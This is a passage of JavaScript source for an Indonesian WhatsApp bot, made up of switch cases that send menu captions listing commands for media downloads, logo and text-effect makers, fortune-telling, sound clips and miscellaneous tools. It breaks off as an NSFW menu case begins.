┆❐ ${prefix}play
┆❐ ${prefix}playmp3
┆❐ ${prefix}playmp4
┆❐ ${prefix}ytsearch
┆❐ ${prefix}tiktok ⟨ Tanpa Watermark ⟩
┆❐ ${prefix}tiktokaudio ⟨ Audio ⟩
┆❐ ${prefix}fbdl
┆❐ ${prefix}igdl
┆❐ ${prefix}twtdl
┆❐ ${prefix}pinterest
┆❐ ${prefix}mediafire
╰────────────◇`
      })
   const devsound = fs.readFileSync('./Media/yamete.mp3')
  tganz.sendMessage(m.chat, { audio: devsound, mimetype: 'audio/mp4', ptt: true, quoted: m })
    }
       break
       case 'makermenu': 
       case 'menumaker': {
      if (isBan) return reply(mess.ban)
   tganz.sendMessage(from, { react: { text: "⏱️", key: m.key }})
tganz.sendMessage(m.chat, {
                    image: pp_bot,
                    caption: 
`════════════════════⊙
⫹⫺ Hᴀɪ ᴋᴀᴋ ${pushname} 🙌🏻
⫹⫺ *${sayyingTime}*
════════════════════⊙
⫹⫺ Mᴏᴅᴇ Bᴏᴛ : ${db.data.settings[botNumber].modebot23 ? '*Semua Orang 👥*' : `*Hanya Owner 👤*`}
════════════════════⊙
${readmore}
╭✄┈┈┈⟬ *Mᴀᴋᴇʀ Mᴇɴᴜ* ⟭
┆❐ ${prefix}anonymous2
┆❐ ${prefix}astronotspace
┆❐ ${prefix}avatar3q360
┆❐ ${prefix}avatarff
┆❐ ${prefix}avatarleagueofking
┆❐ ${prefix}avatarlolbyname
┆❐ ${prefix}avataroverwatch
┆❐ ${prefix}bannerofaov
┆❐ ${prefix}bannerofaov2
┆❐ ${prefix}bannerofapex
┆❐ ${prefix}banneroffreefire
┆❐ ${prefix}banneroflol
┆❐ ${prefix}bannerofoverwatch
┆❐ ${prefix}bannerofpubg
┆❐ ${prefix}bannerytcsgo
┆❐ ${prefix}beautifulgalaxylol
┆❐ ${prefix}beautifulshimmering
┆❐ ${prefix}blueneon
┆❐ ${prefix}circlemarcotteam
┆❐ ${prefix}colorfulpubg
┆❐ ${prefix}companylogo
┆❐ ${prefix}companylogo2
┆❐ ${prefix}coverbannerlol
┆❐ ${prefix}coverdota2
┆❐ ${prefix}coverfblol
┆❐ ${prefix}coverfreefirefb
┆❐ ${prefix}coverleagueofking
┆❐ ${prefix}coverloknew
┆❐ ${prefix}coverofwarface
┆❐ ${prefix}coveronepiecefb
┆❐ ${prefix}rossfirecover
┆❐ ${prefix}rossfirestyle
┆❐ ${prefix}sgocover
┆❐ ${prefix}utegirlgamer
┆❐ ${prefix}yberhunterfb
┆❐ ${prefix}dragonballfb
┆❐ ${prefix}effect3donbeach
┆❐ ${prefix}elegantrotation
┆❐ ${prefix}fbgamepubgcover
┆❐ ${prefix}footballteam
┆❐ ${prefix}gaminglogo4fvs
┆❐ ${prefix}gamingmascot
┆❐ ${prefix}gradientlogo
┆❐ ${prefix}gunlogogaming
┆❐ ${prefix}introvideomaker
┆❐ ${prefix}letterlogos 
┆❐ ${prefix}logoaccording 
┆❐ ${prefix}logogamingassasin 
┆❐ ${prefix}lolcoverbyname 
┆❐ ${prefix}lolpentakill 
┆❐ ${prefix}lolwallpaper 
┆❐ ${prefix}maketeamlogo 
┆❐ ${prefix}mascotstyle 
┆❐ ${prefix}metalmascot 
┆❐ ${prefix}newlolavatar 
┆❐ ${prefix}overwatchcover 
┆❐ ${prefix}overwatchwallpaper 
┆❐ ${prefix}pencilsketch 
┆❐ ${prefix}pubgcutelogo 
┆❐ ${prefix}pubglogomaker 
┆❐ ${prefix}anjing
┆❐ ${prefix}pokemon
┆❐ ${prefix}rovwallpaper 
┆❐ ${prefix}rovwallpaperhd 
┆❐ ${prefix}teamlogo 
┆❐ ${prefix}wallpaperaov 
┆❐ ${prefix}kucing
┆❐ ${prefix}wallpaperml 
┆❐ ${prefix}wallas ⟨ Asthetic ⟩
╰────────────◇`
      })
   const devsound = fs.readFileSync('./Media/yamete.mp3')
  tganz.sendMessage(m.chat, { audio: devsound, mimetype: 'audio/mp4', ptt: true, quoted: m })
    }
       break
       case 'ephotomenu': 
       case 'epotomenu': 
       case 'menuepoto': 
       case 'menuephoto': {
      if (isBan) return reply(mess.ban)
   tganz.sendMessage(from, { react: { text: "⏱️", key: m.key }})
tganz.sendMessage(m.chat, {
                    image: pp_bot,
                    caption: 
`════════════════════⊙
⫹⫺ Hᴀɪ ᴋᴀᴋ ${pushname} 🙌🏻
⫹⫺ *${sayyingTime}*
════════════════════⊙
⫹⫺ Mᴏᴅᴇ Bᴏᴛ : ${db.data.settings[botNumber].modebot23 ? '*Semua Orang 👥*' : `*Hanya Owner 👤*`}
════════════════════⊙
${readmore}
╭✄┈┈┈⟬ *Eᴘʜᴏᴛᴏ Mᴇɴᴜ* ⟭
┆❐ ${prefix}andy
┆❐ ${prefix}hristmas
┆❐ ${prefix}3dchristmas
┆❐ ${prefix}sparklechristmas
┆❐ ${prefix}holographic':
┆❐ ${prefix}deepsea
┆❐ ${prefix}scifi
┆❐ ${prefix}rainbow
┆❐ ${prefix}waterpipe
┆❐ ${prefix}spooky
┆❐ ${prefix}karbon
┆❐ ${prefix}neonlight2
┆❐ ${prefix}pencil
┆❐ ${prefix}ircuit
┆❐ ${prefix}discovery
┆❐ ${prefix}metalic
┆❐ ${prefix}fiction
┆❐ ${prefix}demon
┆❐ ${prefix}3dbox
┆❐ ${prefix}transformer
┆❐ ${prefix}berry
┆❐ ${prefix}thunder
┆❐ ${prefix}magma
┆❐ ${prefix}3dstone
┆❐ ${prefix}greenneon
┆❐ ${prefix}neonlight
┆❐ ${prefix}glitch
┆❐ ${prefix}harrypotter
┆❐ ${prefix}brokenglass
┆❐ ${prefix}papercut
┆❐ ${prefix}lion2
┆❐ ${prefix}watercolor
┆❐ ${prefix}multicolor
┆❐ ${prefix}neondevil
┆❐ ${prefix}underwater
┆❐ ${prefix}graffitibike
┆❐ ${prefix}3davengers
┆❐ ${prefix}snow
┆❐ ${prefix}cloud
┆❐ ${prefix}honey
┆❐ ${prefix}ice
┆❐ ${prefix}fruitjuice
┆❐ ${prefix}biscuit
┆❐ ${prefix}wood
┆❐ ${prefix}whitebear
┆❐ ${prefix}hocolate
┆❐ ${prefix}strawberry
┆❐ ${prefix}matrix
┆❐ ${prefix}blood
┆❐ ${prefix}dropwater
┆❐ ${prefix}toxic
┆❐ ${prefix}lava
┆❐ ${prefix}rock
┆❐ ${prefix}bloodglas
┆❐ ${prefix}hallowen
┆❐ ${prefix}darkgold
┆❐ ${prefix}joker
┆❐ ${prefix}wicker
┆❐ ${prefix}firework
┆❐ ${prefix}skeleton
┆❐ ${prefix}blackpink
┆❐ ${prefix}sand
┆❐ ${prefix}glue
┆❐ ${prefix}1917
┆❐ ${prefix}leaves
╰────────────◇`
      })
   const devsound = fs.readFileSync('./Media/yamete.mp3')
  tganz.sendMessage(m.chat, { audio: devsound, mimetype: 'audio/mp4', ptt: true, quoted: m })
    }
       break
       case 'ramalmenu': 
       case 'menuramal': {
      if (isBan) return reply(mess.ban)
   tganz.sendMessage(from, { react: { text: "⏱️", key: m.key }})
tganz.sendMessage(m.chat, {
                    image: pp_bot,
                    caption: 
`════════════════════⊙
⫹⫺ Hᴀɪ ᴋᴀᴋ ${pushname} 🙌🏻
⫹⫺ *${sayyingTime}*
════════════════════⊙
⫹⫺ Mᴏᴅᴇ Bᴏᴛ : ${db.data.settings[botNumber].modebot23 ? '*Semua Orang 👥*' : `*Hanya Owner 👤*`}
════════════════════⊙
${readmore}
╭✄┈┈┈⟬ *Mᴇɴᴜ Rᴀᴍᴀʟ* ⟭
┆❐ ${prefix}nomorhoki
┆❐ ${prefix}artimimpi
┆❐ ${prefix}artinama
┆❐ ${prefix}ramaljodoh
┆❐ ${prefix}ramaljodohbali
┆❐ ${prefix}suamiistri
┆❐ ${prefix}ramalcinta
┆❐ ${prefix}cocoknama
┆❐ ${prefix}pasangan
┆❐ ${prefix}jadiannikah
┆❐ ${prefix}sifatusaha
┆❐ ${prefix}rezeki
┆❐ ${prefix}pekerjaan
┆❐ ${prefix}nasib
┆❐ ${prefix}penyakit
┆❐ ${prefix}tarot
┆❐ ${prefix}fengshui
┆❐ ${prefix}haribaik
┆❐ ${prefix}harisangar
┆❐ ${prefix}harisial
┆❐ ${prefix}nagahari
┆❐ ${prefix}arahrezeki
┆❐ ${prefix}peruntungan
┆❐ ${prefix}weton
┆❐ ${prefix}karakter
┆❐ ${prefix}keberuntungan
┆❐ ${prefix}memancing
┆❐ ${prefix}masasubur
┆❐ ${prefix}zodiak
╰────────────◇`
      })
   const devsound = fs.readFileSync('./Media/yamete.mp3')
  tganz.sendMessage(m.chat, { audio: devsound, mimetype: 'audio/mp4', ptt: true, quoted: m })
    }
       break
       case 'asupanmenu': 
       case 'menuasupan': {
      if (isBan) return reply(mess.ban)
   tganz.sendMessage(from, { react: { text: "⏱️", key: m.key }})
tganz.sendMessage(m.chat, {
                    image: pp_bot,
                    caption: 
`════════════════════⊙
⫹⫺ Hᴀɪ ᴋᴀᴋ ${pushname} 🙌🏻
⫹⫺ *${sayyingTime}*
════════════════════⊙
⫹⫺ Mᴏᴅᴇ Bᴏᴛ : ${db.data.settings[botNumber].modebot23 ? '*Semua Orang 👥*' : `*Hanya Owner 👤*`}
════════════════════⊙
${readmore}
╭✄┈┈┈⟬ *Asᴜᴘᴀɴ Mᴇɴᴜ* ⟭
┆❐ ${prefix}asupan
┆❐ ${prefix}hea
┆❐ ${prefix}bocil
┆❐ ${prefix}ukhty
┆❐ ${prefix}santuy
┆❐ ${prefix}kayes
┆❐ ${prefix}rika
┆❐ ${prefix}notnot
┆❐ ${prefix}geayubi
┆❐ ${prefix}chika
┆❐ ${prefix}delvira
┆❐ ${prefix}ayu
┆❐ ${prefix}bunga
┆❐ ${prefix}aura
┆❐ ${prefix}nisa
┆❐ ${prefix}ziva
┆❐ ${prefix}yana
┆❐ ${prefix}viona
┆❐ ${prefix}syania
┆❐ ${prefix}riri
┆❐ ${prefix}syifa
┆❐ ${prefix}mama-gina
┆❐ ${prefix}alcakenya
┆❐ ${prefix}mangayutri
╰────────────◇`
      })
   const devsound = fs.readFileSync('./Media/yamete.mp3')
  tganz.sendMessage(m.chat, { audio: devsound, mimetype: 'audio/mp4', ptt: true, quoted: m })
    }
       break
       case 'menulainnya': 
       case 'menulainya': 
       case 'menuother': 
       case 'othermenu': {
      if (isBan) return reply(mess.ban)
   tganz.sendMessage(from, { react: { text: "⏱️", key: m.key }})
tganz.sendMessage(m.chat, {
                    image: pp_bot,
                    caption: 
`════════════════════⊙
⫹⫺ Hᴀɪ ᴋᴀᴋ ${pushname} 🙌🏻
⫹⫺ *${sayyingTime}*
════════════════════⊙
⫹⫺ Mᴏᴅᴇ Bᴏᴛ : ${db.data.settings[botNumber].modebot23 ? '*Semua Orang 👥*' : `*Hanya Owner 👤*`}
════════════════════⊙
${readmore}
╭✄┈┈┈⟬ *Fɪᴛᴜʀ Lᴀɪɴɴʏᴀ* ⟭
┆❐ ${prefix}qcimg ⟨ Quick Chat Versi Gambar ⟩
┆❐ ${prefix}anonymous ⟨ Chat Random ⟩
┆❐ ${prefix}mulai ⟨ Memulai Chatan Anonymous ⟩
┆❐ ${prefix}lanjut ⟨ Mencari Partner Lain ⟩
┆❐ ${prefix}keluar ⟨ Meninggalkan Chat Anonymous ⟩
┆❐ ${prefix}cekapiz ⟨ Cek Api ZenZapis ⟩
┆❐ ${prefix}cekapilol ⟨ Cek Api Lolhuman ⟩
┆❐ ${prefix}quotesanime ⟨ Kata Kata Anime ⟩
┆❐ ${prefix}lirik ⟨ Nama Musik ⟩
┆❐ ${prefix}pcouple ⟨ Foto Pasangan ⟩
┆❐ ${prefix}wm ⟨ Ganti Nama Pencipta Stiker ⟩
┆❐ ${prefix}rmbg ⟨ Hapus Latar Belakang Foto ⟩
┆❐ ${prefix}qr ⟨ Pembutan Teks > Kode QR ⟩
┆❐ ${prefix}jadian ⟨ Jadian Random ⟩
┆❐ ${prefix}menfess ⟨ Pesan Cepat + Anonim ⟩
┆❐ ${prefix}join ⟨ Join Bot Ke Grupmu ⟩
┆❐ ${prefix}wallpaper ⟨ Pencarian Wallpaper ⟩
┆❐ ${prefix}wikimedia
┆❐ ${prefix}bisakah
┆❐ ${prefix}apakah
┆❐ ${prefix}stalkwa ⟨ Melihat Profile Lengkap ⟩
┆❐ ${prefix}bagaimanakah
┆❐ ${prefix}ceksange
┆❐ ${prefix}cekgay
┆❐ ${prefix}ceklesbi
┆❐ ${prefix}neon
┆❐ ${prefix}tspeed ⟨ Speed Test Bot ⟩
┆❐ ${prefix}emoji ⟨ Opsi Emoji ⟩
┆❐ ${prefix}heleh
┆❐ ${prefix}infonomor
┆❐ ${prefix}halah
┆❐ ${prefix}kapan
┆❐ ${prefix}jalantikus-meme
┆❐ ${prefix}merdeka-news
┆❐ ${prefix}antara-news
┆❐ ${prefix}tempo-news
┆❐ ${prefix}kontan-news
┆❐ ${prefix}sindo-news
┆❐ ${prefix}okezone-news
┆❐ ${prefix}daily-news
┆❐ ${prefix}detik-news
┆❐ ${prefix}inews-news
┆❐ ${prefix}kompas-news
┆❐ ${prefix}indozone-news
┆❐ ${prefix}tribun-news
┆❐ ${prefix}cnbc-news
┆❐ ${prefix}tvsearch
┆❐ ${prefix}cnn-news
┆❐ ${prefix}fajar-news
┆❐ ${prefix}darkjoke
┆❐ ${prefix}quotes
┆❐ ${prefix}sertifikatpacar
┆❐ ${prefix}sertifikattolol
┆❐ ${prefix}sertifikatbucin
┆❐ ${prefix}wangy
┆❐ ${prefix}ringtone ⟨ Nada Dering ⟩
┆❐ ${prefix}tinyurl
┆❐ ${prefix}bitly
┆❐ ${prefix}cuttly
┆❐ ${prefix}ssweb ⟨ Screenshot Website ⟩
┆❐ ${prefix}cekmati ⟨ Cek Kapan Kamu Wafat ⟩
┆❐ ${prefix}dilanquote
┆❐ ${prefix}totalf ⟨ Total Fitur Bot ⟩
┆❐ ${prefix}nulis ⟨ Nulis By Bot ⟩
┆❐ ${prefix}google ⟨ Pencarian By Google ⟩
┆❐ ${prefix}cuaca ⟨ Prediksi Cuaca ⟩
┆❐ ${prefix}katasenja
┆❐ ${prefix}cekcantik
┆❐ ${prefix}cekganteng
┆❐ ${prefix}gitclone ⟨ Download File GIT ⟩
┆❐ ${prefix}randomquote
┆❐ ${prefix}rules ⟨ Aturan Penggunaan Bot ⟩
┆❐ ${prefix}dbinary ⟨ Decode ⟩
┆❐ ${prefix}ebinary ⟨ Encode ⟩
┆❐ ${prefix}enc ⟨ Enkripsi Script/Teks Penting ⟩
┆❐ ${prefix}del ⟨ Hapus Pesan Dari Bot ⟩
┆❐ ${prefix}muslimquote
┆❐ ${prefix}galauquote
┆❐ ${prefix}kanyequote
┆❐ ${prefix}trumpquote
┆❐ ${prefix}trumpthink
┆❐ ${prefix}creepyfact
┆❐ ${prefix}faktaunik
┆❐ ${prefix}remini ⟨ Enhance Foto ⟩
┆❐ ${prefix}galau
┆❐ ${prefix}bucin
┆❐ ${prefix}puisi
┆❐ ${prefix}pantun
┆❐ ${prefix}motivasi ⟨ Motivasi Hidup ⟩
┆❐ ${prefix}tts ⟨ Ubah Teks Menjadi Suara ⟩
╰────────────◇`
      })
   const devsound = fs.readFileSync('./Media/yamete.mp3')
  tganz.sendMessage(m.chat, { audio: devsound, mimetype: 'audio/mp4', ptt: true, quoted: m })
    }
       break
       case 'soundmenu': 
       case 'menusound': {
      if (isBan) return reply(mess.ban)
   tganz.sendMessage(from, { react: { text: "⏱️", key: m.key }})
tganz.sendMessage(m.chat, {
                    image: pp_bot,
                    caption: 
`════════════════════⊙
⫹⫺ Hᴀɪ ᴋᴀᴋ ${pushname} 🙌🏻
⫹⫺ *${sayyingTime}*
════════════════════⊙
⫹⫺ Mᴏᴅᴇ Bᴏᴛ : ${db.data.settings[botNumber].modebot23 ? '*Semua Orang 👥*' : `*Hanya Owner 👤*`}
════════════════════⊙
${readmore}
╭✄┈┈┈⟬ *Sᴏᴜɴᴅ Mᴇɴᴜ* ⟭
┆❐ ${prefix}sound1
┆❐ ${prefix}sound2
┆❐ ${prefix}sound3
┆❐ ${prefix}sound4
┆❐ ${prefix}sound5
┆❐ ${prefix}sound6
┆❐ ${prefix}sound7
┆❐ ${prefix}sound8
┆❐ ${prefix}sound9
┆❐ ${prefix}sound10
┆❐ ${prefix}sound11
┆❐ ${prefix}sound12
┆❐ ${prefix}sound13
┆❐ ${prefix}sound14
┆❐ ${prefix}sound15
┆❐ ${prefix}sound16
┆❐ ${prefix}sound17
┆❐ ${prefix}sound18
┆❐ ${prefix}sound19
┆❐ ${prefix}sound20
┆❐ ${prefix}sound21
┆❐ ${prefix}sound22
┆❐ ${prefix}sound23
┆❐ ${prefix}sound24
┆❐ ${prefix}sound25
┆❐ ${prefix}sound26
┆❐ ${prefix}sound27
┆❐ ${prefix}sound28
┆❐ ${prefix}sound29
┆❐ ${prefix}sound30
┆❐ ${prefix}sound31
┆❐ ${prefix}sound32
┆❐ ${prefix}sound33
┆❐ ${prefix}sound34
┆❐ ${prefix}sound35
┆❐ ${prefix}sound36
┆❐ ${prefix}sound37
┆❐ ${prefix}sound38
┆❐ ${prefix}sound39
┆❐ ${prefix}sound40
┆❐ ${prefix}sound41
┆❐ ${prefix}sound42
┆❐ ${prefix}sound43
┆❐ ${prefix}sound44
┆❐ ${prefix}sound45
┆❐ ${prefix}sound46
┆❐ ${prefix}sound47
┆❐ ${prefix}sound48
┆❐ ${prefix}sound49
┆❐ ${prefix}sound50
┆❐ ${prefix}sound51
┆❐ ${prefix}sound52
┆❐ ${prefix}sound53
┆❐ ${prefix}sound54
┆❐ ${prefix}sound55
┆❐ ${prefix}sound56
┆❐ ${prefix}sound57
┆❐ ${prefix}sound58
┆❐ ${prefix}sound59
┆❐ ${prefix}sound60
┆❐ ${prefix}sound61
┆❐ ${prefix}sound62
┆❐ ${prefix}sound63
┆❐ ${prefix}sound64
┆❐ ${prefix}sound65
┆❐ ${prefix}sound66
┆❐ ${prefix}sound67
┆❐ ${prefix}sound68
┆❐ ${prefix}sound69
┆❐ ${prefix}sound70
┆❐ ${prefix}sound71
┆❐ ${prefix}sound72
┆❐ ${prefix}sound73
┆❐ ${prefix}sound74
┆❐ ${prefix}sound75
┆❐ ${prefix}sound76
┆❐ ${prefix}sound77
┆❐ ${prefix}sound78
┆❐ ${prefix}sound79
┆❐ ${prefix}sound80
┆❐ ${prefix}sound81
┆❐ ${prefix}sound82
┆❐ ${prefix}sound83
┆❐ ${prefix}sound84
┆❐ ${prefix}sound85
┆❐ ${prefix}sound86
┆❐ ${prefix}sound87
┆❐ ${prefix}sound88
┆❐ ${prefix}sound89
┆❐ ${prefix}sound90
┆❐ ${prefix}sound91
┆❐ ${prefix}sound92
┆❐ ${prefix}sound93
┆❐ ${prefix}sound94
┆❐ ${prefix}sound95
┆❐ ${prefix}sound96
┆❐ ${prefix}sound97
┆❐ ${prefix}sound98
┆❐ ${prefix}sound99
┆❐ ${prefix}sound100
┆❐ ${prefix}sound101
┆❐ ${prefix}sound102
┆❐ ${prefix}sound103
┆❐ ${prefix}sound104
┆❐ ${prefix}sound105
┆❐ ${prefix}sound106
┆❐ ${prefix}sound107
┆❐ ${prefix}sound108
┆❐ ${prefix}sound109
┆❐ ${prefix}sound110
┆❐ ${prefix}sound111
┆❐ ${prefix}sound112
┆❐ ${prefix}sound113
┆❐ ${prefix}sound114
┆❐ ${prefix}sound115
┆❐ ${prefix}sound116
┆❐ ${prefix}sound117
┆❐ ${prefix}sound118
┆❐ ${prefix}sound119
┆❐ ${prefix}sound120
┆❐ ${prefix}sound121
┆❐ ${prefix}sound122
┆❐ ${prefix}sound123
┆❐ ${prefix}sound124
┆❐ ${prefix}sound125
┆❐ ${prefix}sound126
┆❐ ${prefix}sound127
┆❐ ${prefix}sound128
┆❐ ${prefix}sound129
┆❐ ${prefix}sound130
┆❐ ${prefix}sound131
┆❐ ${prefix}sound132
┆❐ ${prefix}sound133
┆❐ ${prefix}sound134
┆❐ ${prefix}sound135
┆❐ ${prefix}sound136
┆❐ ${prefix}sound137
┆❐ ${prefix}sound138
┆❐ ${prefix}sound139
┆❐ ${prefix}sound140
┆❐ ${prefix}sound141
┆❐ ${prefix}sound142
┆❐ ${prefix}sound143
┆❐ ${prefix}sound144
┆❐ ${prefix}sound145
┆❐ ${prefix}sound146
┆❐ ${prefix}sound147
┆❐ ${prefix}sound148
┆❐ ${prefix}sound149
┆❐ ${prefix}sound150
┆❐ ${prefix}sound151
┆❐ ${prefix}sound152
┆❐ ${prefix}sound153
┆❐ ${prefix}sound154
┆❐ ${prefix}sound155
┆❐ ${prefix}sound156
┆❐ ${prefix}sound157
┆❐ ${prefix}sound158
┆❐ ${prefix}sound159
┆❐ ${prefix}sound160
┆❐ ${prefix}sound161
╰────────────◇`
      })
   const devsound = fs.readFileSync('./Media/yamete.mp3')
  tganz.sendMessage(m.chat, { audio: devsound, mimetype: 'audio/mp4', ptt: true, quoted: m })
    }
       break
       case 'menutextpro': 
       case 'textpromenu': {
      if (isBan) return reply(mess.ban)
   tganz.sendMessage(from, { react: { text: "⏱️", key: m.key }})
tganz.sendMessage(m.chat, {
                    image: pp_bot,
                    caption: 
`════════════════════⊙
⫹⫺ Hᴀɪ ᴋᴀᴋ ${pushname} 🙌🏻
⫹⫺ *${sayyingTime}*
════════════════════⊙
⫹⫺ Mᴏᴅᴇ Bᴏᴛ : ${db.data.settings[botNumber].modebot23 ? '*Semua Orang 👥*' : `*Hanya Owner 👤*`}
════════════════════⊙
${readmore}
╭✄┈┈┈⟬ *Tᴇxᴛ Pʀᴏ* ⟭
┆❐ ${prefix}3dbox
┆❐ ${prefix}3dchrome
┆❐ ${prefix}3dglue
┆❐ ${prefix}3dstone
┆❐ ${prefix}abstra
┆❐ ${prefix}advanced
┆❐ ${prefix}bear
┆❐ ${prefix}berry
┆❐ ${prefix}biscuit
┆❐ ${prefix}black-metal
┆❐ ${prefix}blackpink
┆❐ ${prefix}blood
┆❐ ${prefix}blood2
┆❐ ${prefix}blue-balloon
┆❐ ${prefix}blue-gem
┆❐ ${prefix}blue-glass
┆❐ ${prefix}blue-glitter
┆❐ ${prefix}blue-jewelry
┆❐ ${prefix}blue-metal
┆❐ ${prefix}blue-sparkling
┆❐ ${prefix}bokeh
┆❐ ${prefix}bread
┆❐ ${prefix}broken
┆❐ ${prefix}bronze-glitter
┆❐ ${prefix}andy
┆❐ ${prefix}aptain-as2
┆❐ ${prefix}arbon
┆❐ ${prefix}hocolate
┆❐ ${prefix}hrismast
┆❐ ${prefix}hristmas
┆❐ ${prefix}loudsky
┆❐ ${prefix}yan-balloon
┆❐ ${prefix}yan-glass
┆❐ ${prefix}yan-jewelry
┆❐ ${prefix}yan-sparkling
┆❐ ${prefix}dark-gold
┆❐ ${prefix}decorate
┆❐ ${prefix}decorate-purple
┆❐ ${prefix}decorative
┆❐ ${prefix}deluxe-gold
┆❐ ${prefix}demon
┆❐ ${prefix}denim
┆❐ ${prefix}discovery
┆❐ ${prefix}dropwater
┆❐ ${prefix}drug
┆❐ ${prefix}embossed
┆❐ ${prefix}engraved
┆❐ ${prefix}equalizer
┆❐ ${prefix}eroded-metal
┆❐ ${prefix}fabric
┆❐ ${prefix}fiction
┆❐ ${prefix}firework
┆❐ ${prefix}glitch
┆❐ ${prefix}gloss
┆❐ ${prefix}glossy
┆❐ ${prefix}glossy-blue
┆❐ ${prefix}glossy-carbon
┆❐ ${prefix}gold-balloon
┆❐ ${prefix}gold-glitter
┆❐ ${prefix}gold-sparkling
┆❐ ${prefix}golden
┆❐ ${prefix}gradient
┆❐ ${prefix}gradient2
┆❐ ${prefix}green-balloon
┆❐ ${prefix}green-glass
┆❐ ${prefix}green-glitter
┆❐ ${prefix}green-jewelry
┆❐ ${prefix}green-neon
┆❐ ${prefix}green-sparkling
┆❐ ${prefix}halloween
┆❐ ${prefix}halloween2
┆❐ ${prefix}holographic
┆❐ ${prefix}honey2
┆❐ ${prefix}hot-metal
┆❐ ${prefix}ice
┆❐ ${prefix}joker
┆❐ ${prefix}juice
┆❐ ${prefix}koifish
┆❐ ${prefix}luxury2
┆❐ ${prefix}magma
┆❐ ${prefix}marble
┆❐ ${prefix}marble2
┆❐ ${prefix}matrix
┆❐ ${prefix}metal-silver
┆❐ ${prefix}metaldark
┆❐ ${prefix}metallic2
┆❐ ${prefix}minion
┆❐ ${prefix}multicolor
┆❐ ${prefix}natural
┆❐ ${prefix}neon
┆❐ ${prefix}neon-devil
┆❐ ${prefix}neon-light
┆❐ ${prefix}neon2
┆❐ ${prefix}neonc
┆❐ ${prefix}neonlight
┆❐ ${prefix}neonligth2
┆❐ ${prefix}newyear
┆❐ ${prefix}newyear2
┆❐ ${prefix}orange-glass
┆❐ ${prefix}orange-jewelry
┆❐ ${prefix}oscar
┆❐ ${prefix}papercut
┆❐ ${prefix}peridot
┆❐ ${prefix}pink-balloon
┆❐ ${prefix}pink-glitter
┆❐ ${prefix}pink-sparkling
┆❐ ${prefix}purple
┆❐ ${prefix}purple-balloon
┆❐ ${prefix}purple-gem
┆❐ ${prefix}purple-glass
┆❐ ${prefix}purple-glitter
┆❐ ${prefix}purple-jewelry
┆❐ ${prefix}purple-shiny-glass
┆❐ ${prefix}purple-sparkling
┆❐ ${prefix}rainbow2
┆❐ ${prefix}red-balloon
┆❐ ${prefix}red-glass
┆❐ ${prefix}red-jewelry
┆❐ ${prefix}red-sparkling
┆❐ ${prefix}road-warning
┆❐ ${prefix}teknologi
┆❐ ${prefix}rock
┆❐ ${prefix}rusty
┆❐ ${prefix}scifi
┆❐ ${prefix}shiny
┆❐ ${prefix}silver-glitter
┆❐ ${prefix}silver-jewelry
┆❐ ${prefix}sircuit
┆❐ ${prefix}skeleton
┆❐ ${prefix}sketch
┆❐ ${prefix}snow
┆❐ ${prefix}steel
┆❐ ${prefix}strawberry
┆❐ ${prefix}summer
┆❐ ${prefix}summery
┆❐ ${prefix}thunder
┆❐ ${prefix}thunder2
┆❐ ${prefix}toxic
┆❐ ${prefix}transformer
┆❐ ${prefix}underwater
┆❐ ${prefix}wall
┆❐ ${prefix}water-pipe
┆❐ ${prefix}watercolor
┆❐ ${prefix}wicker
┆❐ ${prefix}wonderful-graffiti
┆❐ ${prefix}wood
┆❐ ${prefix}writing
┆❐ ${prefix}xmas
┆❐ ${prefix}yellow-glass
┆❐ ${prefix}yellow-jewelry
╰────────────◇`
      })
   const devsound = fs.readFileSync('./Media/yamete.mp3')
  tganz.sendMessage(m.chat, { audio: devsound, mimetype: 'audio/mp4', ptt: true, quoted: m })
    }
       break
       case 'photoxymenu': 
       case 'menupotoxy': 
       case 'potoxymenu': 
       case 'menuphotoxy': {
      if (isBan) return reply(mess.ban)
   tganz.sendMessage(from, { react: { text: "⏱️", key: m.key }})
tganz.sendMessage(m.chat, {
                    image: pp_bot,
                    caption: 
`════════════════════⊙
⫹⫺ Hᴀɪ ᴋᴀᴋ ${pushname} 🙌🏻
⫹⫺ *${sayyingTime}*
════════════════════⊙
⫹⫺ Mᴏᴅᴇ Bᴏᴛ : ${db.data.settings[botNumber].modebot23 ? '*Semua Orang 👥*' : `*Hanya Owner 👤*`}
════════════════════⊙
${readmore}
╭✄┈┈┈⟬ *PʜᴏᴛᴏOxʏ Mᴇɴᴜ* ⟭
┆❐ ${prefix}typography-flower
┆❐ ${prefix}under-flower
┆❐ ${prefix}bevel-text
┆❐ ${prefix}silk-text
┆❐ ${prefix}sweet-andy
┆❐ ${prefix}smoke-typography
┆❐ ${prefix}arvedwood
┆❐ ${prefix}scary-cemetery
┆❐ ${prefix}royallook
┆❐ ${prefix}coffeecup2
┆❐ ${prefix}illuminated
┆❐ ${prefix}harry-potter2
┆❐ ${prefix}birthday-cake
┆❐ ${prefix}embroidery
┆❐ ${prefix}flaming
┆❐ ${prefix}furtext
┆❐ ${prefix}nightsky
┆❐ ${prefix}glow-rainbow
┆❐ ${prefix}gradient-avatar
┆❐ ${prefix}white-cube
┆❐ ${prefix}graffiti-cover
┆❐ ${prefix}rainbow-shine
┆❐ ${prefix}smoky-neon
┆❐ ${prefix}quotes-underfall
┆❐ ${prefix}vector-nature
┆❐ ${prefix}yellow-rose
┆❐ ${prefix}love-text
┆❐ ${prefix}underwater-ocean
┆❐ ${prefix}nature-text
┆❐ ${prefix}wolf-metal
┆❐ ${prefix}summer-text
┆❐ ${prefix}wooden-board
┆❐ ${prefix}quote-wood
┆❐ ${prefix}love-text
┆❐ ${prefix}quotes-undergrass
┆❐ ${prefix}naruto-banner
┆❐ ${prefix}love-message
┆❐ ${prefix}textoncup2
┆❐ ${prefix}burn-paper
┆❐ ${prefix}smoke
┆❐ ${prefix}romantic-messages
┆❐ ${prefix}shadow-sky
┆❐ ${prefix}text-cup
┆❐ ${prefix}coffecup
┆❐ ${prefix}battlegrounds-logo
┆❐ ${prefix}battlefield4
┆❐ ${prefix}text-8bit
╰────────────◇`
      })
   const devsound = fs.readFileSync('./Media/yamete.mp3')
  tganz.sendMessage(m.chat, { audio: devsound, mimetype: 'audio/mp4', ptt: true, quoted: m })
    }
       break
       case 'menunsfw': 
       case 'nsfwmenu': {
      if (isBan) return reply(mess.ban)
   tganz.sendMessage(from, { react: { text: "⏱️", key: m.key }})
tganz.sendMessage(m.chat, {
                    image: pp_bot,
                    caption: 
`════════════════════⊙
⫹⫺ Hᴀɪ ᴋᴀᴋ ${pushname} 🙌🏻
⫹⫺ *${sayyingTime}*
════════════════════⊙
⫹⫺ Mᴏᴅᴇ Bᴏᴛ : ${db.data.settings[botNumber].modebot23 ? '*Semua Orang 👥*' : `*Hanya Owner 👤*`}
════════════════════⊙
${readmore}
